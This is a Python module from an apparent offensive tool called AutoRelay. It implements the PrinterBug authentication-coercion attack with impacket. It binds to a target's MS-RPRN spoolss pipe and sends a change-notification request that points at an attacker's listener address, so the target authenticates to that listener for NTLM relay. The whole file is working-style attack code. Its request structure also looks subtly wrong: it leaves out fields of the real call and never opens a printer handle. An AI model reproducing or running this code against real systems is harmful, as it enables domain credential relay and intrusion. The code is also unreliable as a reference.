"""
AutoRelay — PrinterBug coercion module.
"""

from __future__ import annotations
import uuid
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import RPC_UNICODE_STRING
from util.log import get_logger

log = get_logger(__name__)
MS_RPRN_UUID = "12345678-1234-abcd-ef00-0123456789ab"


class RpcRemoteFindFirstPrinterChangeNotificationEx(NDRCALL):
    opnum = 65
    structure = (
        ('hPrinter', '<L=0'),
        ('fdwFlags', '<L=0'),
        ('pPrinterName', RPC_UNICODE_STRING),
        ('pszLocalMachine', RPC_UNICODE_STRING),
    )


def trigger(target: str, listener_ip: str, username: str = "", password: str = "", domain: str = "", timeout: float = 8.0) -> bool:
    log.info(f"Triggering PrinterBug on {target}")
    string_binding = f"ncacn_np:{target}[\\pipe\\spoolss]"

    try:
        rpc_transport = transport.DCERPCTransportFactory(string_binding)
        rpc_transport.set_connect_timeout(timeout)
        if username:
            rpc_transport.set_credentials(username, password, domain)
        dce = rpc_transport.get_dce_rpc()
        dce.connect()
        dce.bind(uuid.UUID(MS_RPRN_UUID).bytes_le)
    except Exception as e:
        log.error(f"Failed to connect to MS-RPRN on {target}: {e}")
        return False

    unc_path = f"\\\\{listener_ip}\\share"

    try:
        request = RpcRemoteFindFirstPrinterChangeNotificationEx()
        request['hPrinter'] = 0
        request['fdwFlags'] = 0
        request['pPrinterName'] = unc_path
        request['pszLocalMachine'] = unc_path

        try:
            dce.request(request)
        except Exception as e:
            log.debug(f"Expected error: {e}")

        log.info("PrinterBug trigger sent.")
        return True
    except Exception as e:
        log.error(f"PrinterBug trigger failed: {e}")
        return False
    finally:
        try:
            dce.disconnect()
        except:
            pass
